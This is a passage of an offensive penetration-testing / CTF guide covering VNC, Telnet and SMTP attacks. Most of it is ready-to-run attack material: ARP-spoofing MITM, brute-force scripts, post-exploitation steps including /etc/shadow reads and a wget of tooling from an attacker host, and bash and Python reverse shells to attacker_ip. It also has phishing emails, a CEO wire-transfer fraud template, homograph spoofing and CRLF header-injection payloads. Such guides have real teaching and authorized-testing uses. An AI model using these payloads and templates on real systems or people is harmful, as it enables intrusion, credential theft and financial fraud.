#### [Unverified] VNC Registry Manipulation (Windows)

```bash
# On Windows systems, VNC password stored in registry
# If local privilege escalation achieved:

reg query HKLM\Software\RealVNC\vncserver /v Password
# Extracts encrypted password

# Decrypt using RealVNC key extraction tools
# Tools available for RealVNC, TightVNC, UltraVNC
```

#### Authentication Bypass Exploitation Workflow

1. **Identify VNC service** - Port scanning and banner grabbing
2. **Detect authentication type** - RFB version and security options
3. **Test trivial bypasses** - Empty password, defaults, no auth
4. **Analyze protocol** - Capture and analyze authentication exchange
5. **Exploit weaknesses** - Downgrade, buffer overflow, predictability
6. **Gain access** - Connect and establish remote session
7. **Post-exploitation** - Lateral movement, privilege escalation, data extraction

---

VNC exploitation in CTF scenarios typically chains with network reconnaissance and leverages weak configurations or unpatched vulnerabilities. The combination of brute force effectiveness, weak encryption, and authentication flaws makes VNC a high-value target in internal network compromise scenarios.

---

## Telnet Exploitation

### Telnet Credential Theft (Plaintext)

Telnet transmits all data, including credentials, in plaintext without encryption, making it vulnerable to interception and credential theft.

**Network Sniffing for Telnet Credentials**

```bash
# Capture telnet traffic with tcpdump
tcpdump -i eth0 -A port 23 -w telnet_capture.pcap

# Live capture with readable output
tcpdump -i eth0 -A port 23

# Filter for telnet authentication
tcpdump -i eth0 -A 'tcp port 23 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x6c6f6769)'

# Using Wireshark filter for telnet
# Filter: tcp.port == 23
# Follow TCP stream to see credentials in plaintext

# Extract credentials from pcap file
tshark -r telnet_capture.pcap -Y "telnet" -T fields -e telnet.data | tr -d '\n'

# Using strings on pcap
strings telnet_capture.pcap | grep -iE "(username|login|password)"
```

**Man-in-the-Middle (MITM) for Telnet**

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoofing to position as MITM
arpspoof -i eth0 -t target_ip gateway_ip
arpspoof -i eth0 -t gateway_ip target_ip

# Capture telnet traffic during MITM
tcpdump -i eth0 port 23 -A -w mitm_telnet.pcap

# Using ettercap for MITM
ettercap -T -q -i eth0 -M arp:remote /target_ip// /gateway_ip//

# Using bettercap for MITM
bettercap -iface eth0
# In bettercap console:
# set arp.spoof.targets target_ip
# arp.spoof on
# net.sniff on
```

**Passive Network Monitoring**

```bash
# Monitor network segment for telnet sessions
ngrep -d eth0 -W byline port 23

# Filter for authentication strings
ngrep -d eth0 -W byline 'login|password' port 23

# Using Wireshark/tshark for continuous monitoring
tshark -i eth0 -f "tcp port 23" -Y "telnet.data" -T fields -e telnet.data

# Decode telnet data
tshark -i eth0 -f "tcp port 23" -Y "telnet.data" -T fields -e telnet.data | xxd -r -p
```

**Credential Extraction from Packet Captures**

```bash
# Parse pcap for telnet credentials
python3 << 'EOF'
from scapy.all import *

def extract_telnet_creds(pcap_file):
    packets = rdpcap(pcap_file)
    for packet in packets:
        if packet.haslayer(TCP) and packet[TCP].dport == 23:
            if packet.haslayer(Raw):
                data = packet[Raw].load
                try:
                    print(data.decode('utf-8', errors='ignore'))
                except:
                    pass

extract_telnet_creds('telnet_capture.pcap')
EOF

# Using NetworkMiner for automatic credential extraction
# NetworkMiner will automatically extract credentials from pcap files
# Open pcap in NetworkMiner and check "Credentials" tab
```

### Telnet Brute Force

**Basic Telnet Brute Force**

```bash
# Using hydra for telnet brute force
hydra -l username -P /usr/share/wordlists/rockyou.txt telnet://target_ip

# Multiple usernames
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt telnet://target_ip

# With specific port
hydra -l admin -P passwords.txt telnet://target_ip:23

# Verbose output
hydra -l root -P /usr/share/wordlists/rockyou.txt telnet://target_ip -V

# Multiple threads for faster brute force
hydra -l admin -P passwords.txt telnet://target_ip -t 4

# With timeout adjustments
hydra -l admin -P passwords.txt telnet://target_ip -w 30 -t 4
```

**Medusa Telnet Brute Force**

```bash
# Basic medusa brute force
medusa -h target_ip -u admin -P passwords.txt -M telnet

# Multiple targets
medusa -H targets.txt -u admin -P passwords.txt -M telnet

# Multiple users and passwords
medusa -h target_ip -U users.txt -P passwords.txt -M telnet

# With thread control
medusa -h target_ip -u admin -P passwords.txt -M telnet -t 10

# Continue on success
medusa -h target_ip -u admin -P passwords.txt -M telnet -F
```

**Nmap Telnet Brute Force**

```bash
# Using nmap scripting engine
nmap -p 23 --script telnet-brute --script-args userdb=users.txt,passdb=passwords.txt target_ip

# With timing adjustments
nmap -p 23 --script telnet-brute --script-args userdb=users.txt,passdb=passwords.txt,brute.threads=5 target_ip

# Single user brute force
nmap -p 23 --script telnet-brute --script-args telnet-brute.username=admin,passdb=passwords.txt target_ip
```

**Custom Telnet Brute Force Script**

```bash
# Python telnet brute force
python3 << 'EOF'
import telnetlib
import sys

def telnet_bruteforce(host, username, password_list):
    with open(password_list, 'r') as f:
        for password in f:
            password = password.strip()
            try:
                tn = telnetlib.Telnet(host, 23, timeout=10)
                tn.read_until(b"login: ", timeout=5)
                tn.write(username.encode('ascii') + b"\n")
                tn.read_until(b"Password: ", timeout=5)
                tn.write(password.encode('ascii') + b"\n")
                
                response = tn.read_some().decode('ascii')
                if "incorrect" not in response.lower() and "failed" not in response.lower():
                    print(f"[+] Success! Username: {username}, Password: {password}")
                    tn.close()
                    return True
                else:
                    print(f"[-] Failed: {password}")
                tn.close()
            except Exception as e:
                print(f"[!] Error with {password}: {str(e)}")
                continue
    return False

# Usage
telnet_bruteforce("target_ip", "admin", "passwords.txt")
EOF
```

**Optimized Brute Force Strategy**

```bash
# Create targeted password list
cat > telnet_passwords.txt << EOF
admin
password
123456
root
telnet
cisco
1234
EOF

# Try default credentials first
hydra -C /usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt telnet://target_ip

# Then common passwords
hydra -l admin -P telnet_passwords.txt telnet://target_ip

# Username = password attempts
hydra -l admin -p admin telnet://target_ip
hydra -l root -p root telnet://target_ip

# Null/empty password attempts
hydra -l admin -p "" telnet://target_ip
```

### Telnet Service Vulnerabilities

**Telnet Service Enumeration**

```bash
# Basic telnet banner grabbing
telnet target_ip 23
nc target_ip 23

# Automated banner grabbing
nmap -p 23 -sV target_ip
nmap -p 23 --script banner target_ip

# Using metasploit for enumeration
msfconsole -q -x "use auxiliary/scanner/telnet/telnet_version; set RHOSTS target_ip; run; exit"

# Detailed service detection
nmap -p 23 -A target_ip

# Check for telnet encryption support
nmap -p 23 --script telnet-encryption target_ip
```

**Buffer Overflow Testing**

```bash
# Send oversized input to test for buffer overflow
python3 -c "print('A' * 5000)" | telnet target_ip 23

# Fuzzing login prompt
for i in $(seq 100 5000 100); do
  echo "[*] Testing with $i bytes"
  python3 -c "print('A' * $i)" | timeout 5 telnet target_ip 23
done

# Using metasploit fuzzer
msfconsole -q << EOF
use auxiliary/fuzzers/telnet/telnet_overflow
set RHOSTS target_ip
run
exit
EOF
```

**Common Telnet CVE Exploitation**

```bash
# Search for telnet exploits in searchsploit
searchsploit telnet

# Specific version exploits
searchsploit "telnet 1.0"
searchsploit "cisco telnet"

# FreeBSD Telnet authentication bypass (CVE-2011-4862)
# [Unverified] This affects specific FreeBSD versions
searchsploit "FreeBSD telnet"

# Check for specific vulnerabilities with nmap
nmap -p 23 --script telnet-ntlm-info target_ip
nmap -p 23 --script unusual-port target_ip
```

**Telnet IAC (Interpret As Command) Exploitation**

```bash
# Send IAC commands for enumeration
python3 << 'EOF'
import telnetlib
import time

host = "target_ip"
tn = telnetlib.Telnet(host, 23)

# Send various IAC commands
iac_commands = [
    b"\xff\xfb\x01",  # WILL ECHO
    b"\xff\xfb\x03",  # WILL SUPPRESS GO AHEAD
    b"\xff\xfd\x18",  # DO TERMINAL TYPE
    b"\xff\xfd\x1f",  # DO NAWS (Negotiate About Window Size)
    b"\xff\xfa\x18\x00\x58\x54\x45\x52\x4d\xff\xf0",  # SB TERMINAL-TYPE
]

for cmd in iac_commands:
    tn.write(cmd)
    time.sleep(0.5)
    response = tn.read_very_eager()
    print(f"Response: {response}")

tn.close()
EOF
```

**Telnet Environment Variable Exploitation**

```bash
# Test for environment variable injection
# Some telnet implementations allow setting environment variables

python3 << 'EOF'
import telnetlib

tn = telnetlib.Telnet("target_ip", 23)

# Attempt to set malicious environment variables
# This can sometimes lead to command injection
env_vars = b"\xff\xfa\x24\x00\x01USER\x01malicious\xff\xf0"
tn.write(env_vars)

# Read response
print(tn.read_some())
tn.close()
EOF
```

### Telnet Default Credentials

**Common Default Credentials Testing**

```bash
# Create default credential list
cat > telnet_defaults.txt << EOF
admin:admin
admin:password
root:root
root:password
cisco:cisco
admin:
root:
administrator:administrator
user:user
guest:guest
test:test
telnet:telnet
1234:1234
admin:1234
root:1234
EOF

# Test with hydra using credential pairs
hydra -C telnet_defaults.txt telnet://target_ip

# Test common vendor defaults
# Cisco
telnet target_ip
# Try: cisco/cisco, admin/admin

# 3Com
# Try: admin/admin, admin/1234

# Netgear
# Try: admin/password, admin/1234
```

**Vendor-Specific Default Credentials**

```bash
# Cisco devices
hydra -l admin -p admin telnet://target_ip
hydra -l cisco -p cisco telnet://target_ip

# HP devices
hydra -l admin -p admin telnet://target_ip
hydra -l administrator -p administrator telnet://target_ip

# Dell devices
hydra -l admin -p admin telnet://target_ip
hydra -l root -p calvin telnet://target_ip

# Netgear
hydra -l admin -p password telnet://target_ip
hydra -l admin -p 1234 telnet://target_ip

# D-Link
hydra -l admin -p admin telnet://target_ip
hydra -l admin -p "" telnet://target_ip

# Linksys
hydra -l admin -p admin telnet://target_ip
hydra -l "" -p admin telnet://target_ip
```

**Using SecLists for Default Credentials**

```bash
# Install SecLists if not present
git clone https://github.com/danielmiessler/SecLists.git /usr/share/seclists

# Test with comprehensive default credential list
hydra -C /usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt telnet://target_ip

# Vendor-specific lists
hydra -C /usr/share/seclists/Passwords/Default-Credentials/cisco-ios-default-passwords.txt telnet://target_ip

# IoT device defaults
hydra -C /usr/share/seclists/Passwords/Default-Credentials/iot-default-userpass.txt telnet://target_ip
```

**Automated Default Credential Scanner**

```bash
# Using metasploit scanner
msfconsole -q << EOF
use auxiliary/scanner/telnet/telnet_login
set RHOSTS target_ip
set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
set PASS_FILE /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
set STOP_ON_SUCCESS true
run
exit
EOF

# Nmap default credential check
nmap -p 23 --script telnet-brute --script-args brute.credfile=/usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt target_ip
```

**Post-Exploitation After Successful Telnet Access**

```bash
# Once logged in via telnet
telnet target_ip

# Enumerate system information
uname -a
cat /etc/*release*
hostname
whoami
id

# Check for privilege escalation opportunities
sudo -l
cat /etc/sudoers
find / -perm -4000 2>/dev/null

# Network enumeration
ifconfig
ip addr
netstat -antup
ss -tulpn

# User enumeration
cat /etc/passwd
cat /etc/shadow 2>/dev/null
w
who
last

# Check running services
ps aux
systemctl list-units --type=service

# Download additional tools if needed
wget http://attacker_ip/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

**Establishing Persistent Access**

```bash
# After gaining telnet access, establish more secure connection

# Generate SSH key pair
ssh-keygen -t rsa -b 4096 -f telnet_access

# Add public key to authorized_keys (if SSH available)
echo "ssh-rsa YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys

# Or establish reverse shell
bash -i >& /dev/tcp/attacker_ip/4444 0>&1

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Or use meterpreter
# Generate payload and upload via telnet session
```

**Detection and Logging**

```bash
# Check for telnet activity logs on target
cat /var/log/auth.log | grep telnet
cat /var/log/secure | grep telnet
journalctl -u telnet.service

# Monitor active telnet connections
netstat -an | grep :23
lsof -i :23

# Check for suspicious telnet configuration
cat /etc/xinetd.d/telnet
cat /etc/inetd.conf | grep telnet
```

---

**Critical Security Notes:**

1. **Plaintext Transmission** - All telnet traffic is unencrypted and easily intercepted
2. **[Inference]** Telnet should be disabled in production environments and replaced with SSH
3. **Network Segmentation** - Credential theft requires network access to intercept traffic
4. **Legal Authorization Required** - Only test on systems you have explicit permission to assess
5. **Modern Alternatives** - SSH (port 22) provides encrypted alternative to telnet with similar functionality

---

## SMTP Exploitation

### Open Relay Exploitation

SMTP open relay occurs when a mail server accepts and forwards emails from any source to any destination without authentication, allowing it to be abused for spam or phishing campaigns.

**Detection Techniques:**

1. **Using Nmap**:

```bash
# Check for open relay
nmap -p25 --script smtp-open-relay target.com

# Comprehensive SMTP scan
nmap -p25,465,587 --script smtp-* target.com

# Multiple targets
nmap -p25 --script smtp-open-relay -iL targets.txt

# With verbose output
nmap -p25 --script smtp-open-relay -v target.com
```

2. **Manual testing with Telnet**:

```bash
# Connect to SMTP server
telnet target.com 25

# SMTP commands sequence:
HELO attacker.com
MAIL FROM:<test@external.com>
RCPT TO:<victim@anotherdomain.com>
DATA
Subject: Test Email
From: test@external.com
To: victim@anotherdomain.com

This is a test message.
.
QUIT

# If accepted without authentication, relay is open
```

3. **Manual testing with nc (netcat)**:

```bash
# Connect
nc target.com 25

# Test relay
HELO test.com
MAIL FROM:<attacker@external.com>
RCPT TO:<victim@external.com>
DATA
Subject: Relay Test

Test message
.
QUIT
```

4. **Using swaks (Swiss Army Knife for SMTP)**:

```bash
# Install swaks
apt-get install swaks

# Basic open relay test
swaks --to victim@external.com --from sender@external.com --server target.com

# Test with authentication bypass attempt
swaks --to victim@external.com --from sender@external.com --server target.com --auth NONE

# Verbose output
swaks --to victim@external.com --from sender@external.com --server target.com -v

# Test multiple recipients
swaks --to victim1@external.com,victim2@external.com --from sender@external.com --server target.com

# Custom subject and body
swaks --to victim@external.com --from sender@external.com --server target.com \
  --header "Subject: Test Email" --body "This is a test message"
```

5. **Using Metasploit**:

```bash
msfconsole
use auxiliary/scanner/smtp/smtp_relay
set RHOSTS target.com
set MAILFROM attacker@external.com
set MAILTO victim@external.com
run

# Scan multiple hosts
set RHOSTS 192.168.1.0/24
run
```

6. **Automated scanning script**:

```bash
#!/bin/bash
# relay_check.sh

TARGET=$1
FROM="test@external.com"
TO="victim@anotherdomain.com"

echo "[*] Testing SMTP open relay on $TARGET"

{
  sleep 1
  echo "HELO test.com"
  sleep 1
  echo "MAIL FROM:<$FROM>"
  sleep 1
  echo "RCPT TO:<$TO>"
  sleep 1
  echo "DATA"
  sleep 1
  echo "Subject: Relay Test"
  echo "From: $FROM"
  echo "To: $TO"
  echo ""
  echo "This is a relay test."
  echo "."
  sleep 1
  echo "QUIT"
} | nc -w 5 $TARGET 25

# Usage: ./relay_check.sh target.com
```

**Exploitation Methods:**

1. **Mass mailing through open relay**:

```bash
# Using swaks with recipient list
while read recipient; do
  swaks --to "$recipient" --from "sender@legitimate.com" \
    --server target.com \
    --header "Subject: Important Notice" \
    --body "Email content here"
  sleep 2  # Avoid rate limiting
done < recipients.txt

# Using sendEmail
sendEmail -f sender@domain.com -t victim@domain.com \
  -s target.com:25 \
  -u "Subject Line" \
  -m "Email body" \
  -v
```

2. **Phishing campaign setup**:

```bash
# Create HTML phishing email
cat > phishing_email.html <<EOF
<html>
<body>
<h2>Account Verification Required</h2>
<p>Please click below to verify your account:</p>
<a href="http://attacker.com/phish">Verify Account</a>
</body>
</html>
EOF

# Send via open relay
swaks --to targets@victim.com \
  --from "noreply@legitimate-looking.com" \
  --server target.com \
  --header "Subject: Account Verification Required" \
  --body phishing_email.html \
  --attach-type text/html
```

3. **Using Python for automated relay abuse**:

```python
#!/usr/bin/env python3
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def send_via_relay(smtp_server, sender, recipient, subject, body):
    msg = MIMEMultipart()
    msg['From'] = sender
    msg['To'] = recipient
    msg['Subject'] = subject
    
    msg.attach(MIMEText(body, 'plain'))
    
    try:
        server = smtplib.SMTP(smtp_server, 25, timeout=10)
        server.set_debuglevel(1)
        server.sendmail(sender, recipient, msg.as_string())
        server.quit()
        print(f"[+] Email sent to {recipient}")
    except Exception as e:
        print(f"[-] Error: {e}")

# Usage
send_via_relay("target.com", "sender@external.com", 
               "victim@external.com", "Test Subject", 
               "Email body content")
```

**Testing Different Relay Scenarios:**

```bash
# Test 1: External to external
swaks --to external1@domain.com --from external2@domain.com --server target.com

# Test 2: Internal to external
swaks --to external@domain.com --from internal@target.com --server target.com

# Test 3: External to internal
swaks --to internal@target.com --from external@domain.com --server target.com

# Test 4: Spoofed internal address
swaks --to victim@external.com --from admin@target.com --server target.com

# Test 5: Bypass with localhost
swaks --to victim@external.com --from sender@localhost --server target.com

# Test 6: IP address in MAIL FROM
swaks --to victim@external.com --from "sender@[192.168.1.100]" --server target.com
```

### Mail Spoofing

Mail spoofing involves forging the sender address to make emails appear from a trusted source.

**SPF/DKIM/DMARC Detection:**

1. **Check email security records**:

```bash
# Check SPF record
dig txt target.com | grep spf
nslookup -type=txt target.com | grep spf
host -t txt target.com | grep spf

# Check DMARC record
dig txt _dmarc.target.com
nslookup -type=txt _dmarc.target.com

# Check DKIM selector (common selectors)
dig txt default._domainkey.target.com
dig txt google._domainkey.target.com
dig txt selector1._domainkey.target.com
dig txt k1._domainkey.target.com

# Automated check
curl -s "https://mxtoolbox.com/SuperTool.aspx?action=spf%3a$DOMAIN&run=toolpage"
```

2. **Using specialized tools**:

```bash
# Using spoofcheck
git clone https://github.com/BishopFox/spoofcheck.git
cd spoofcheck
pip install -r requirements.txt
python spoofcheck.py target.com

# Analyze results for weak configurations
# Look for: No SPF, SPF with ~all, No DMARC, DMARC with p=none
```

**Simple Spoofing Techniques:**

1. **Using swaks**:

```bash
# Basic spoofing
swaks --to victim@target.com \
  --from "ceo@target.com" \
  --server target.com \
  --header "Subject: Urgent: Wire Transfer" \
  --body "Please process the attached wire transfer immediately."

# Spoof with custom headers
swaks --to victim@target.com \
  --from "admin@target.com" \
  --header "Subject: Password Reset Required" \
  --header "Reply-To: attacker@evil.com" \
  --header "X-Priority: 1" \
  --server target.com \
  --body "Your password has expired. Please reset: http://evil.com/reset"

# Display name spoofing
swaks --to victim@target.com \
  --from "\"IT Department\" <attacker@evil.com>" \
  --server target.com \
  --header "Subject: Security Update Required"
```

2. **Using sendEmail**:

```bash
# Basic spoofing
sendEmail -f ceo@target.com -t victim@target.com \
  -s mail.target.com:25 \
  -u "Urgent Request" \
  -m "Please complete this task immediately." \
  -v

# With attachment
sendEmail -f hr@target.com -t employee@target.com \
  -s mail.target.com:25 \
  -u "Updated Employee Handbook" \
  -m "Please review the attached handbook." \
  -a malicious.pdf \
  -v
```

3. **Manual spoofing with telnet/nc**:

```bash
nc target.com 25

EHLO attacker.com
MAIL FROM:<ceo@target.com>
RCPT TO:<victim@target.com>
DATA
From: CEO <ceo@target.com>
To: Employee <victim@target.com>
Subject: Urgent Wire Transfer
Date: $(date -R)
Message-ID: <$(uuidgen)@target.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8

Please initiate the following wire transfer immediately:
Amount: $50,000
Account: 123456789
Bank: Example Bank

This is time-sensitive.

Best regards,
CEO
.
QUIT
```

4. **Advanced spoofing with Python**:

```python
#!/usr/bin/env python3
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formatdate, make_msgid

def spoof_email(smtp_server, spoof_from, display_name, to, subject, body):
    msg = MIMEMultipart()
    msg['From'] = f'"{display_name}" <{spoof_from}>'
    msg['To'] = to
    msg['Subject'] = subject
    msg['Date'] = formatdate(localtime=True)
    msg['Message-ID'] = make_msgid(domain=spoof_from.split('@')[1])
    
    # Add custom headers for legitimacy
    msg['X-Mailer'] = 'Microsoft Outlook 16.0'
    msg['X-Priority'] = '1'
    msg['Importance'] = 'high'
    
    msg.attach(MIMEText(body, 'html'))
    
    try:
        server = smtplib.SMTP(smtp_server, 25)
        server.sendmail(spoof_from, to, msg.as_string())
        server.quit()
        print(f"[+] Spoofed email sent successfully")
    except Exception as e:
        print(f"[-] Error: {e}")

# Usage
html_body = """
<html>
<body>
<p>Dear Employee,</p>
<p>Please review and complete the attached security training:</p>
<p><a href="http://evil.com/phish">Complete Training</a></p>
<p>Best regards,<br>IT Security Team</p>
</body>
</html>
"""

spoof_email("target.com", "security@target.com", "IT Security", 
            "victim@target.com", "Mandatory Security Training", html_body)
```

**Bypassing SPF:**

```bash
# If SPF exists but is permissive (~all or +all)
# Example SPF: "v=spf1 include:_spf.google.com ~all"
# The ~all (softfail) may still deliver spoofed emails

# Test spoofing with permissive SPF
swaks --to victim@target.com --from admin@target.com --server target.com

# Spoof from included domain
# If SPF includes google.com, spoof from google.com addresses
swaks --to victim@target.com --from "noreply@google.com" --server target.com

# Use MAIL FROM and From header mismatch
# MAIL FROM passes SPF, visible From is spoofed
nc target.com 25

EHLO test.com
MAIL FROM:<legitimate@target.com>
RCPT TO:<victim@external.com>
DATA
From: CEO <ceo@target.com>
To: Victim <victim@external.com>
Subject: Urgent Request

Spoofed content here.
.
QUIT
```

**Bypassing DMARC:**

```bash
# Check DMARC policy
dig txt _dmarc.target.com

# If p=none (monitoring only), spoofing still works
swaks --to victim@external.com --from admin@target.com --server smtp.external.com

# If DMARC checks "From" domain, use subdomain
swaks --to victim@external.com --from admin@mail.target.com --server smtp.external.com

# Cousin domain spoofing
swaks --to victim@target.com --from admin@target.co --server smtp.relay.com
```

**Display Name Spoofing:**

```bash
# Even with SPF/DKIM/DMARC, display name can be spoofed
swaks --to victim@target.com \
  --from "\"CEO John Smith\" <attacker@evil.com>" \
  --server smtp.evil.com \
  --header "Subject: Urgent Payment Required"

# Homograph attack (similar looking domains)
swaks --to victim@target.com \
  --from "admin@targеt.com" \  # Note: Cyrillic 'е' instead of 'e'
  --server smtp.relay.com

# Using Unicode characters
swaks --to victim@target.com \
  --from "\"CEO\" <admin@tаrget.com>" \  # Cyrillic 'а' instead of 'a'
  --server smtp.relay.com
```

### VRFY/EXPN Enumeration

VRFY (verify) and EXPN (expand) are SMTP commands used to enumerate valid email addresses and mailing lists.

**Manual Enumeration:**

1. **Using telnet/nc**:

```bash
# VRFY command
nc target.com 25

VRFY admin
VRFY root
VRFY administrator
VRFY postmaster
VRFY user
QUIT

# EXPN command (expand mailing list)
nc target.com 25

EXPN admin
EXPN all
EXPN staff
EXPN employees
QUIT

# Responses:
# 250 - User exists
# 550 - User does not exist
# 252 - Cannot verify, but will attempt delivery
# 502 - Command not implemented
```

2. **Automated enumeration script**:

```bash
#!/bin/bash
# smtp_enum.sh

TARGET=$1
PORT=25

if [ -z "$TARGET" ]; then
  echo "Usage: $0 <target>"
  exit 1
fi

echo "[*] Enumerating SMTP users on $TARGET"

for user in $(cat /usr/share/seclists/Usernames/top-usernames-shortlist.txt); do
  response=$(echo "VRFY $user" | nc -w 3 $TARGET $PORT 2>/dev/null | head -1)
  echo "$user: $response"
  if echo "$response" | grep -q "^250"; then
    echo "[+] Valid user found: $user"
  fi
done
```

**Using smtp-user-enum:**

```bash
# Install
apt-get install smtp-user-enum

# VRFY enumeration
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t target.com

# EXPN enumeration
smtp-user-enum -M EXPN -U usernames.txt -t target.com

# RCPT TO enumeration (more reliable)
smtp-user-enum -M RCPT -U usernames.txt -t target.com

# With custom port
smtp-user-enum -M VRFY -U usernames.txt -t target.com -p 587

# Multiple threads
smtp-user-enum -M VRFY -U usernames.txt -t target.com -w 10

# Domain mode (for Exchange)
smtp-user-enum -M RCPT -U usernames.txt -t target.com -D domain.local
```

**Using Metasploit:**

```bash
msfconsole
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS target.com
set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
run

# EXPN method
set UNIXONLY false
run

# Multiple hosts
set RHOSTS 192.168.1.0/24
set THREADS 10
run
```

**Using Nmap:**

```bash
# SMTP enumeration script
nmap -p25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} target.com

# With custom usernames
nmap -p25 --script smtp-enum-users --script-args userdb=usernames.txt target.com

# Multiple methods
nmap -p25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY} target.com
```

**RCPT TO Enumeration (Most Reliable):**

```bash
# RCPT TO is harder to disable and more reliable
nc target.com 25

EHLO test.com
MAIL FROM:<test@test.com>
RCPT TO:<admin@target.com>
RCPT TO:<user@target.com>
RCPT TO:<root@target.com>
QUIT

# Responses:
# 250 - Recipient OK (user exists)
# 550 - User unknown (does not exist)
# 553 - Mailbox name invalid
```

**Automated RCPT TO enumeration:**

```bash
#!/bin/bash
# rcpt_enum.sh

TARGET=$1
DOMAIN=$2

echo "[*] Enumerating via RCPT TO on $TARGET"

for user in $(cat usernames.txt); do
  {
    sleep 1
    echo "EHLO test.com"
    sleep 1
    echo "MAIL FROM:<test@test.com>"
    sleep 1
    echo "RCPT TO:<$user@$DOMAIN>"
    sleep 1
    echo "QUIT"
  } | nc -w 5 $TARGET 25 | grep "^250.*RCPT" && echo "[+] Valid: $user@$DOMAIN"
done

# Usage: ./rcpt_enum.sh target.com domain.com
```

**Creating Custom Username Lists:**

```bash
# Common usernames
cat > common_users.txt <<EOF
admin
administrator
root
postmaster
webmaster
info
support
sales
contact
help
noreply
abuse
hostmaster
EOF

# Generate from company info
cat > company_users.txt <<EOF
john.smith
j.smith
jsmith
john
smith
jane.doe
j.doe
jdoe
EOF

# Use existing lists
cp /usr/share/seclists/Usernames/top-usernames-shortlist.txt usernames.txt
```

**Microsoft Exchange Specific:**

```bash
# OWA user enumeration
# Valid user returns different timing/response than invalid

# Timing-based enumeration
for user in $(cat users.txt); do
  start=$(date +%s%N)
  curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://target.com/owa/auth.owa \
    -d "destination=https://target.com/owa&username=$user@domain.com&password=wrong" \
    > /dev/null
  end=$(date +%s%N)
  elapsed=$((($end - $start) / 1000000))
  echo "$user: ${elapsed}ms"
done

# ActiveSync enumeration
for user in $(cat users.txt); do
  curl -s -k -X OPTIONS https://target.com/Microsoft-Server-ActiveSync \
    -u "$user@domain.com:wrong" \
    -H "MS-ASProtocolVersion: 14.0" | head -1
done
```

### SMTP Injection

SMTP injection exploits poor input validation in web applications that send emails, allowing attackers to inject additional SMTP commands.

**Command Injection in Email Forms:**

1. **Basic SMTP header injection**:

```bash
# Inject additional headers via email field
# Input: victim@target.com%0ACc: attacker@evil.com

# Test in contact form
curl -X POST http://target.com/contact \
  -d "email=victim@target.com%0ACc: attacker@evil.com" \
  -d "subject=Test" \
  -d "message=Test message"

# Inject BCC
curl -X POST http://target.com/contact \
  -d "email=victim@target.com%0ABcc: attacker@evil.com" \
  -d "subject=Test" \
  -d "message=Test"

# Multiple recipients
curl -X POST http://target.com/contact \
  -d "email=victim@target.com%0ACc: attacker1@evil.com%0ACc: attacker2@evil.com" \
  -d "subject=Test" \
  -d "message=Test"
```

2. **CRLF injection payloads**:

```bash
# Basic CRLF (%0D%0A = \r\n)
email=victim@target.com%0D%0ACc:attacker@evil.com

# Inject custom headers
email=victim@target.com%0D%0AX-Custom-Header:injected

# Inject body content
email=victim@target.com%0D%0A%0D%0AInjected body content

# Full email injection
email=victim@target.com%0D%0ASubject:Injected%20Subject%0D%0A%0D%0AInjected%20body

# Using different encodings
email=victim@target.com\r\nCc:attacker@evil.com  # URL decoded
email=victim@target.com%0ACc:attacker@evil.com   # LF only
email=victim@target.com%0DCc:attacker@evil.com   # CR only
```

3. **Testing injection points**:

```bash
# Subject field injection
curl -X POST http://target.com/contact \
  -d "email=test@test.com" \
  -d "subject=Test%0ACc:attacker@evil.com" \
  -d "message=Test"

# Message body injection
curl -X POST http://target.com/contact \
  -d "email=test@test.com" \
  -d "subject=Test" \
  -d "message=Test%0A%0ACc:attacker@evil.com"

# Name field injection
curl -X POST http://target.com/contact \
  -d "name=John%0ACc:attacker@evil.com" \
  -d "email=test@test.com" \
  -d "subject=Test" \
  -d "message=Test"
```

**Advanced SMTP Injection Techniques:**

1. **Phishing via injection**:

```bash
# Inject HTML content
curl -X POST http://target.com/contact \
  -d "email=victim@target.com" \
  -d "subject=Test" \
  -d "message=Test%0D%0AContent-Type:text/html%0D%0A%0D%0A<html><a href='http://evil.com/phish'>Click here</a></html>"

# Inject attachment reference [Inference - depends on mail client]
curl -X POST http://target.com/contact \
  -d "email=victim@target.com" \
  -d "subject=Test" \
  -d "message=Test%0D%0AContent-Type:multipart/mixed%0D%0A%0D%0AAttachment content"
```

2. **Mass mailing via injection**:

```bash
# Inject multiple recipients
recipient="victim1@target.com%0ACc:victim2@target.com%0ACc:victim3@target.com%0ACc:victim4@target.com"

curl -X POST http://target.com/contact \
  -d "email=$recipient" \
  -d "subject=Important Notice" \
  -d "message=This is a mass email"

# Using BCC to hide recipients
recipient="victim1@target.com%0ABcc:victim2@target.com%0ABcc:victim3@target.com"
```

3. **Bypassing filters**:

```bash
# Null byte injection [Inference - language/version dependent]
email=victim@target.com%00%0ACc:attacker@evil.com

# Unicode encoding
email=victim@target.com\u000ACc:attacker@evil.com

# Mixed case headers
email=victim@target.com%0Acc:attacker@evil.com
email=victim@target.com%0ACC:attacker@evil.com

# Whitespace obfuscation
email=victim@target.com%0A%20Cc:attacker@evil.com
email=victim@target.com%0ACc:%20attacker@evil.com

# Tab character
email=victim@target.com%0A%09Cc:attacker@evil.com
```

**Testing Web Applications:**

1. **Identify email functionality**:

```bash
# Common endpoints
/contact
/feedback
/support
/subscribe
/newsletter
/register
/forgot-password
/invite

